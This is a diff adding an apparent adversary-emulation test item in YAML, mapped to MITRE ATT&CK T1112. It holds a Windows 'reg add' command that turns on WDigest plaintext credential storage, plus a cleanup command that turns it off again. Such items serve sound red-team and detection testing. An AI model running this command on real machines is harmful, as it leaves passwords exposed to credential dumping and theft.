@@ -1,0 +1,23 @@
+---
+- id: 8ef0e743e8f073af665288aaf631a71a
+  name: Modify registry to store logon credentials
+  description: 'Sets registry key that will tell windows to store plaintext passwords
+    (making the system vulnerable to clear text / cleartext password dumping).
+
+    Upon execution, the message "The operation completed successfully." will be displayed.
+
+    Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1112
+    name: Modify Registry
+  platforms:
+    windows:
+      cmd:
+        command: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+          /v UseLogonCredential /t REG_DWORD /d 1 /f
+        payloads: []
+        cleanup: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+          /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1
